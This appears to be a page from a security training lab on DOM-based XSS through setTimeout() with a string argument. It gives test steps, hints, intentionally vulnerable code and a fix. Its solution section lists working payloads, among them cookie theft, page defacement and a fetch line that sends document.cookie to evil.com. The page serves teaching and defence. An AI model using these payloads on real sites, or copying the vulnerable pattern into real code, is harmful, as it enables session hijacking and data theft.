🔹 Lab #26 · DOM-Based XSS

setTimeout(userString) Vulnerability

When setTimeout() receives a string as the first parameter, it executes that string as JavaScript after the delay. This is EXTREMELY DANGEROUS with user input.

WARNING: setTimeout(codeString, delay) executes the code string as JavaScript. This is as dangerous as eval() when the string comes from user input!
TEST:
1. Type alert("XSS after 1 second!") in the textarea
2. Click "Execute setTimeout()" → Alert pops after 1 second!
3. Try different delay values
Enter JavaScript Code to Execute (will run after delay):
1 second = 1000ms
Quick Payloads (click to test):
URL Parameter Attack:

Try adding ?code=alert('XSS from URL!') to the URL

Enter JavaScript code, set delay, and click "Execute setTimeout()".
HOW setTimeout(codeString) WORKS:
• setTimeout("alert('XSS')", 1000) executes the string after 1 second
• This is IDENTICAL to using eval() - it runs any JavaScript
• Attackers can inject malicious code that executes after a delay
• NEVER pass user-controlled strings to setTimeout!
Hints
  • Type: alert("XSS") and click Execute - alert pops after delay
  • Try: document.body.style.backgroundColor = "red"
  • Try: console.log("This runs in console after delay")
  • Multiple timeouts can be queued simultaneously

Solution

Working Payloads (any JavaScript works):

  • alert('XSS') - Alert after delay
  • alert(document.cookie) - Steal cookies
  • document.body.innerHTML = '<h1>Hacked</h1>' - Deface page
  • fetch('https://evil.com/steal?data=' + document.cookie) - Exfiltrate data

Vulnerable Code:

let userCode = document.getElementById('input').value;
let delay = document.getElementById('delay').value;
setTimeout(userCode, delay);  // EXTREMELY DANGEROUS!

Fix: NEVER pass user-controlled strings to setTimeout. Use a function reference instead:

// Safe way:
setTimeout(function() {
    // Safe operations here
}, delay);
